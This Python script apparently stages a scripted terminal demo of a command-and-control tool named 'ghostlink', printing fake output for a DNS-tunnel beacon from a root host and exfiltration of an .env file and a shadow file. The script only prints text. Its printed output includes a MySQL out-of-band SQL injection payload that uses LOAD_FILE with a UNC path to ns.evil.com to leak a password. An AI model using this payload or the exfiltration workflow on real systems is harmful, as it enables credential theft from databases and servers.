import sys, time

def type_cmd(text, delay=0.035):
    for c in text:
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(delay)
    print()

def fast(text):
    print(text)
    sys.stdout.flush()

RESET = "\033[0m"
BOLD = "\033[1m"
DIM = "\033[2m"
RED = "\033[31m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
BLUE = "\033[34m"
MAGENTA = "\033[35m"
CYAN = "\033[36m"
WHITE = "\033[37m"
GRAY = "\033[90m"

time.sleep(0.3)
fast(f"{CYAN}jankesec@c2-node{RESET}:{BLUE}~/ghostlink{RESET}# {BOLD}./ghostlink-server -channel dns -addr 0.0.0.0:5353 -key op -api 127.0.0.1:8888{RESET}")
time.sleep(0.4)

banner_art = [
    r"   _______                 __  ___       __  ",
    r"  / ____/ /_  ____  _____/ /_/ (_)____  / /__",
    r" / / __/ __ \/ __ \/ ___/ __/ / / __ \/ //_/",
    r"/ /_/ / / / / /_/ (__  ) /_/ / / / / / ,<   ",
    r"\____/_/ /_/\____/____/\__/_/_/_/ /_/_/|_|  ",
]
fast(f"{MAGENTA}{BOLD}")
for line in banner_art:
    fast(line)
fast(f"   {CYAN}Covert C2 & OOB Exfil Framework v1.0.1{RESET}\n")
time.sleep(0.2)
fast(f"{BLUE}[*]{RESET} Covert Channel: {GREEN}dns (TXT tunnel){RESET} | Listen: {YELLOW}0.0.0.0:5353{RESET} | Crypto: {GREEN}AES-256-GCM{RESET}")
fast(f"{BLUE}[*]{RESET} Forward Error Correction (FEC): {GREEN}Active (XOR Parity - 33% Tolerance){RESET}")
fast(f"{BLUE}[*]{RESET} Headless Automation REST API: {CYAN}http://127.0.0.1:8888/api/sessions{RESET}")
fast(f"{BLUE}[*]{RESET} Listening for covert beacons and exfil frames...")
time.sleep(1.0)

fast(f"\n{GREEN}[+]{RESET} Inbound covert beacon from {YELLOW}10.0.4.18:52194{RESET}")
fast(f"{GREEN}[+]{RESET} Session #1 registered {GRAY}[channel: dns | latency: 38ms | os: linux/amd64]{RESET}")
time.sleep(0.7)

fast(f"{CYAN}[exfil]{RESET} Incoming covert stream from session #1: {BOLD}.env{RESET} (284 bytes)")
fast(f"{CYAN}[exfil]{RESET} Decompressing zlib payload... {GREEN}OK{RESET}")
fast(f"{CYAN}[exfil]{RESET} Reassembled 3 frames + 1 FEC shard: {GREEN}Integrity Verified{RESET}")
fast(f"{GREEN}[✓]{RESET} Exfiltrated: {BOLD}/var/www/.env{RESET} -> {GRAY}./exfiltrated/.env_1{RESET} {YELLOW}[sha256:4a8f9c1b]{RESET}")
time.sleep(0.9)

sys.stdout.write(f"\n{BOLD}{CYAN}c2{RESET}> ")
sys.stdout.flush()
time.sleep(0.6)
type_cmd("sessions", delay=0.05)
time.sleep(0.15)
fast(f"{BLUE}[*]{RESET} 1 active covert session(s):")
fast(f"  {GREEN}●{RESET} {BOLD}#1{RESET} — {YELLOW}10.0.4.18:52194{RESET} {GRAY}| channel: dns | jitter: office | ping: 38ms{RESET}")
time.sleep(0.8)

sys.stdout.write(f"\n{BOLD}{CYAN}c2{RESET}> ")
sys.stdout.flush()
time.sleep(0.5)
type_cmd("run sysinfo", delay=0.05)
time.sleep(0.2)
fast(f"{BLUE}[*]{RESET} Module {BOLD}sysinfo{RESET} dispatched to session #1")
fast(f"  {GRAY}Hostname   :{RESET} {BOLD}PROD-SRV-01{RESET}")
fast(f"  {GRAY}OS / Arch  :{RESET} Ubuntu 22.04 LTS (x86_64 Linux 5.15.0-89)")
fast(f"  {GRAY}Privileges :{RESET} {RED}uid=0(root) gid=0(root){RESET}")
fast(f"  {GRAY}Interfaces :{RESET} eth0: 10.0.4.18, docker0: 172.17.0.1")
time.sleep(0.9)

sys.stdout.write(f"\n{BOLD}{CYAN}c2{RESET}> ")
sys.stdout.flush()
time.sleep(0.5)
type_cmd('sqli mysql ns.evil.com "SELECT password FROM mysql.user LIMIT 1"', delay=0.035)
time.sleep(0.2)
fast(f"{MAGENTA}=== MySQL DNS OOB Payloads ==={RESET} {GRAY}(domain: ns.evil.com){RESET}")
fast(f"{GRAY}# UNC Injection via LOAD_FILE:{RESET}")
fast(f"{YELLOW}SELECT LOAD_FILE(CONCAT('\\\\\\\\', (SELECT password FROM mysql.user LIMIT 1), '.ns.evil.com\\\\a'));{RESET}")
time.sleep(0.9)

sys.stdout.write(f"\n{BOLD}{CYAN}c2{RESET}> ")
sys.stdout.flush()
time.sleep(0.5)
type_cmd("exfils", delay=0.05)
time.sleep(0.15)
fast(f"{BLUE}[*]{RESET} Exfiltrated Artifacts Store:")
fast(f"  {GREEN}✓{RESET} {BOLD}.env_1{RESET}      (284 B)   SHA-256: {YELLOW}4a8f9c1b3e82d710...{RESET} {GRAY}[Received via DNS TXT]{RESET}")
fast(f"  {GREEN}✓{RESET} {BOLD}shadow_1{RESET}    (1.4 KB)  SHA-256: {YELLOW}8f01b9ca33e210aa...{RESET} {GRAY}[Received via DoH]{RESET}")
time.sleep(1.2)

sys.stdout.write(f"\n{BOLD}{CYAN}c2{RESET}> ")
sys.stdout.flush()
time.sleep(1.5)
